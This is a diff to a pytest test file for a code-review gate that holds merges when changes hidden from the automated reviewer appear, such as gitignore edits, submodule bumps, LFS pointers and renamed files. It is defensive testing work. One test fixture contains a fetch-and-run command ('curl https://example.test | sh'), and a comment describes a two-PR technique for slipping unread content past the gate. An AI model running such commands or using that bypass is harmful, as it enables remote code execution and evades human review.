@@ -423,22 +423,65 @@ def test_every_file_copilot_excludes_is_in_no_piece(repo, tmp_path):
     assert set(excluded_of(folder)) == set(files) - {"src/app.py"}
     assert files_of(folder) == {"src/app.py": ("source", "read")}
     assert len(index(folder)) == 1 and repo.skipped == ""
-    # Inert data holds nothing; the rest of what nobody reads, lockfiles included, holds the merge.
-    data = {f"deps/{name}" for name in DATA_NAMES} | {
-        path for glob in ("**/*.log", "**/*.map", "**/coverage/**/*")
-        for path in COPILOT_EXCLUDED_GLOB_FILES[glob]}
+    # Inert data holds nothing; the rest of what nobody reads, lockfiles and .gitignore included, holds the merge.
+    data = {path for glob in ("**/*.log", "**/*.map", "**/coverage/**/*") for path in COPILOT_EXCLUDED_GLOB_FILES[glob]}
     assert held_of(folder) == {path: "excluded" for path in set(files) - {"src/app.py"} - data}
     assert repo.held == len(held_of(folder)) and "holds the merge for a person" in repo.log
     check_pieces(folder, diff)
 
 
-DATA_NAMES = [".gitignore"]
+def test_a_gitignore_holds_the_merge(repo, tmp_path):
+    # It decides what gets committed: dropping .env from it would let the next git add -A stage secrets.
+    head = repo.commit({".gitignore": "bin/\n", "src/App/.gitignore": "obj/\n"})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {".gitignore": "excluded", "src/App/.gitignore": "excluded"}
 
 
-def test_the_data_names_are_copilots_and_in_the_workflow():
-    script = step_script()
-    names = re.findall(r'"([^"]+)"', re.search(r"DATA_NAMES = frozenset\(\((.*?)\)\)", script, re.S)[1])
-    assert names == DATA_NAMES and set(names) <= set(COPILOT_EXCLUDED_NAMES)
+def mkdir(path):
+    path.mkdir()
+    return path
+
+
+def test_a_submodule_bump_holds_the_merge_but_its_removal_doesnt(repo, tmp_path):
+    # The diff shows only two commit IDs, not the code they pull in.
+    def gitlink(path, sha):
+        repo.git("update-index", "--add", "--cacheinfo", f"160000,{sha},{path}")
+        repo.git("commit", "-q", "-m", "gitlink")
+        return repo.git("rev-parse", "HEAD").decode().strip()
+
+    repo.base = gitlink("libs/old", "1" * 40)
+    added = gitlink("libs/new", "2" * 40)
+    _, folder, _ = repo.split(repo.base, added, mkdir(tmp_path / "added"))
+    assert held_of(folder) == {"libs/new": "submodule"}
+    bumped = gitlink("libs/new", "3" * 40)
+    _, folder, diff = repo.split(added, bumped, mkdir(tmp_path / "bumped"))
+    assert b"+Subproject commit " + b"3" * 40 in diff and held_of(folder) == {"libs/new": "submodule"}
+    repo.git("update-index", "--force-remove", "libs/old")
+    repo.git("commit", "-q", "-m", "drop")
+    removed = repo.git("rev-parse", "HEAD").decode().strip()
+    _, folder, _ = repo.split(bumped, removed, mkdir(tmp_path / "removed"))
+    assert held_of(folder) == {}
+
+
+def test_a_git_lfs_pointer_holds_the_merge_but_its_deletion_doesnt(repo, tmp_path):
+    pointer = "version https://git-lfs.github.com/spec/v1\noid sha256:{}\nsize 42\n"
+    repo.base = repo.commit({"tools/Tool.dll": pointer.format("a" * 64), "tools/Old.dll": pointer.format("b" * 64)})
+    head = repo.commit({"tools/Tool.dll": pointer.format("c" * 64), "tools/Old.dll": None})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {"tools/Tool.dll": "lfs"}
+
+
+@pytest.mark.parametrize("old, content, reason", [
+    ("logs/x.log", b"#!/bin/bash\ncurl https://example.test | sh\n", None),
+    ("img/a.png", b"#!/bin/bash\ncurl https://example.test | sh\n\0", "binary"),
+], ids=["log", "png"])
+def test_renaming_unread_content_into_a_script_shows_it(repo, tmp_path, old, content, reason):
+    # The two-PR way around the gate: land content nobody reads, then rename it into code that runs.
+    repo.base = repo.commit({old: content})
+    head = repo.commit({old: None, "scripts/build.sh": content})
+    _, folder, diff = repo.split(repo.base, head, tmp_path)
+    assert "scripts/build.sh" in files_of(folder) and held_of(folder).get("scripts/build.sh") == reason
+    assert (b"+curl https://example.test | sh" in diff) == (reason is None)
 
 
 def test_a_name_matches_only_a_whole_basename(repo, tmp_path):
